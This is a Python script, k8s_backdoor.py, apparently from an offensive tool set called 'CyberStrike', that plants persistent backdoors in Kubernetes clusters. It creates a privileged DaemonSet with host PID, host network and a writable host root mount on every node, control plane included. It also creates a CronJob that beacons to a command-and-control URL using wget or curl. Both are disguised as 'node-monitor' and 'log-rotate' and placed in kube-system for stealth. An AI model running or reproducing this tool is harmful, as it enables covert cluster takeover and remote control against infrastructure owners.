#!/usr/bin/env python3
"""
k8s_backdoor.py — Kubernetes Persistence via DaemonSet/CronJob

Creates persistent backdoors in Kubernetes clusters:
- DaemonSet: Privileged container on every node with hostPID/hostNetwork
- CronJob: Periodic callback execution on configurable schedule

Deploys to kube-system namespace by default for stealth. Includes tolerations
to schedule on control plane nodes. Tracks created resources in state file.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    from kubernetes import client, config
    from kubernetes.client.rest import ApiException
except ImportError:
    print("ERROR: kubernetes client required. Install: pip3 install kubernetes", file=sys.stderr)
    sys.exit(1)


STATE_FILE = os.path.expanduser("~/.cyberstrike/kubehook-state.json")


def load_k8s_config(args):
    try:
        if args.kubeconfig:
            config.load_kube_config(config_file=args.kubeconfig)
        else:
            try:
                config.load_incluster_config()
            except config.ConfigException:
                config.load_kube_config()
    except Exception as e:
        print(f"ERROR: Cannot load Kubernetes config: {e}", file=sys.stderr)
        sys.exit(1)


def load_state():
    """Load state file for tracking created resources."""
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError):
            pass
    return {"created_resources": []}


def save_state(state):
    """Save state file."""
    state_dir = os.path.dirname(STATE_FILE)
    os.makedirs(state_dir, exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)


class K8sBackdoor:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.apps_v1 = None
        self.batch_v1 = None
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Kubernetes Persistence Backdoor")
        print("=" * 70)
        print(f"PID:        {os.getpid()}")
        print(f"Type:       {self.args.type}")
        print(f"Image:      {self.args.image}")
        print(f"Namespace:  {self.args.namespace}")
        print(f"Output:     {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:    {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            status = record.get("status", "info")
            print(f"[{record['timestamp']}] [{status.upper()}] {record.get('resource_type', 'unknown')}", flush=True)
            if record.get("name"):
                print(f"  name: {record['name']}", flush=True)
            if record.get("namespace"):
                print(f"  namespace: {record['namespace']}", flush=True)
            if record.get("image"):
                print(f"  image: {record['image']}", flush=True)
            if record.get("schedule"):
                print(f"  schedule: {record['schedule']}", flush=True)
            if record.get("callback_url"):
                print(f"  callback: {record['callback_url']}", flush=True)
            if record.get("details"):
                print(f"  details: {record['details']}", flush=True)
            if record.get("error"):
                print(f"  error: {record['error']}", flush=True)

    def track_resource(self, kind, name, namespace):
        """Track a created resource for later cleanup."""
        resource = {
            "kind": kind,
            "name": name,
            "namespace": namespace,
            "created_at": datetime.now().isoformat(),
            "labels": {"app": "cyberstrike"},
        }
        self.state["created_resources"].append(resource)
        save_state(self.state)

    def build_tolerations(self):
        """Build tolerations to run on control plane / master nodes."""
        return [
            client.V1Toleration(
                key="node-role.kubernetes.io/control-plane",
                operator="Exists",
                effect="NoSchedule",
            ),
            client.V1Toleration(
                key="node-role.kubernetes.io/master",
                operator="Exists",
                effect="NoSchedule",
            ),
            client.V1Toleration(
                operator="Exists",
            ),
        ]

    def create_daemonset(self):
        """Create a privileged DaemonSet that runs on every node."""
        namespace = self.args.namespace
        name = f"node-monitor-{int(time.time()) % 100000}"

        container = client.V1Container(
            name="agent",
            image=self.args.image,
            security_context=client.V1SecurityContext(
                privileged=True,
                run_as_user=0,
            ),
            volume_mounts=[
                client.V1VolumeMount(name="host-root", mount_path="/host", read_only=False),
                client.V1VolumeMount(name="host-proc", mount_path="/hostproc", read_only=True),
            ],
        )

        template = client.V1PodTemplateSpec(
            metadata=client.V1ObjectMeta(
                labels={"app": "cyberstrike", "component": "node-monitor"},
            ),
            spec=client.V1PodSpec(
                containers=[container],
                host_network=True,
                host_pid=True,
                tolerations=self.build_tolerations(),
                volumes=[
                    client.V1Volume(
                        name="host-root",
                        host_path=client.V1HostPathVolumeSource(path="/", type="Directory"),
                    ),
                    client.V1Volume(
                        name="host-proc",
                        host_path=client.V1HostPathVolumeSource(path="/proc", type="Directory"),
                    ),
                ],
                service_account_name="default",
                automount_service_account_token=True,
            ),
        )

        daemonset = client.V1DaemonSet(
            metadata=client.V1ObjectMeta(
                name=name,
                namespace=namespace,
                labels={"app": "cyberstrike", "component": "node-monitor"},
            ),
            spec=client.V1DaemonSetSpec(
                selector=client.V1LabelSelector(
                    match_labels={"app": "cyberstrike", "component": "node-monitor"},
                ),
                template=template,
            ),
        )

        try:
            self.apps_v1.create_namespaced_daemon_set(namespace=namespace, body=daemonset)
            self.track_resource("DaemonSet", name, namespace)
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "status": "success",
                "resource_type": "DaemonSet",
                "name": name,
                "namespace": namespace,
                "image": self.args.image,
                "details": f"Privileged DaemonSet '{name}' created with hostPID, hostNetwork, host root mount",
            })
        except ApiException as e:
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "status": "error",
                "resource_type": "DaemonSet",
                "name": name,
                "namespace": namespace,
                "error": f"Failed to create DaemonSet: {e.reason}",
            })

    def create_cronjob(self):
        """Create a CronJob for periodic callback execution."""
        namespace = self.args.namespace
        name = f"log-rotate-{int(time.time()) % 100000}"
        schedule = self.args.schedule
        callback_url = self.args.callback_url

        command = ["sh", "-c"]
        if callback_url:
            command.append(
                f"wget -q -O- {callback_url} || curl -sf {callback_url} || true"
            )
        else:
            command.append("sleep 1")

        container = client.V1Container(
            name="job",
            image=self.args.image,
            command=command,
            security_context=client.V1SecurityContext(
                run_as_user=0,
            ),
        )

        template = client.V1PodTemplateSpec(
            metadata=client.V1ObjectMeta(
                labels={"app": "cyberstrike", "component": "log-rotate"},
            ),
            spec=client.V1PodSpec(
                containers=[container],
                restart_policy="Never",
                tolerations=self.build_tolerations(),
                service_account_name="default",
                automount_service_account_token=True,
            ),
        )

        job_template = client.V1JobTemplateSpec(
            spec=client.V1JobSpec(
                template=template,
                backoff_limit=1,
                ttl_seconds_after_finished=60,
            ),
        )

        cronjob = client.V1CronJob(
            metadata=client.V1ObjectMeta(
                name=name,
                namespace=namespace,
                labels={"app": "cyberstrike", "component": "log-rotate"},
            ),
            spec=client.V1CronJobSpec(
                schedule=schedule,
                job_template=job_template,
                successful_jobs_history_limit=1,
                failed_jobs_history_limit=1,
                concurrency_policy="Forbid",
            ),
        )

        try:
            self.batch_v1.create_namespaced_cron_job(namespace=namespace, body=cronjob)
            self.track_resource("CronJob", name, namespace)
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "status": "success",
                "resource_type": "CronJob",
                "name": name,
                "namespace": namespace,
                "image": self.args.image,
                "schedule": schedule,
                "callback_url": callback_url,
                "details": f"CronJob '{name}' created with schedule '{schedule}'",
            })
        except ApiException as e:
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "status": "error",
                "resource_type": "CronJob",
                "name": name,
                "namespace": namespace,
                "error": f"Failed to create CronJob: {e.reason}",
            })

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        load_k8s_config(self.args)
        self.apps_v1 = client.AppsV1Api()
        self.batch_v1 = client.BatchV1Api()

        if self.args.type == "daemonset":
            self.create_daemonset()
        elif self.args.type == "cronjob":
            self.create_cronjob()
        else:
            print(f"ERROR: Unknown type: {self.args.type}", file=sys.stderr)
            sys.exit(1)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- k8s_backdoor summary ---")
        print(f"Type: {self.args.type}")
        print(f"Events emitted: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Create persistent backdoors in Kubernetes clusters.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 k8s_backdoor.py --type daemonset --image alpine:latest\n"
            "  python3 k8s_backdoor.py --type cronjob --image alpine:latest --callback-url http://c2.example.com/beacon\n"
            "  python3 k8s_backdoor.py --type cronjob --image busybox --schedule '*/10 * * * *'\n"
            "  python3 k8s_backdoor.py --type daemonset --image ubuntu --namespace default --json-output\n"
        ),
    )
    parser.add_argument("--type", type=str, required=True, choices=["daemonset", "cronjob"],
                        help="Backdoor type: daemonset or cronjob")
    parser.add_argument("--image", type=str, required=True, help="Container image to deploy")
    parser.add_argument("--callback-url", type=str, default=None,
                        help="Callback URL for cronjob to contact (cronjob type only)")
    parser.add_argument("--namespace", type=str, default="kube-system",
                        help="Namespace to deploy into (default: kube-system)")
    parser.add_argument("--schedule", type=str, default="*/5 * * * *",
                        help="Cron schedule for cronjob (default: '*/5 * * * *')")
    parser.add_argument("--kubeconfig", type=str, default=None, help="Path to kubeconfig file")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    backdoor = K8sBackdoor(args)
    backdoor.run()


if __name__ == "__main__":
    main()
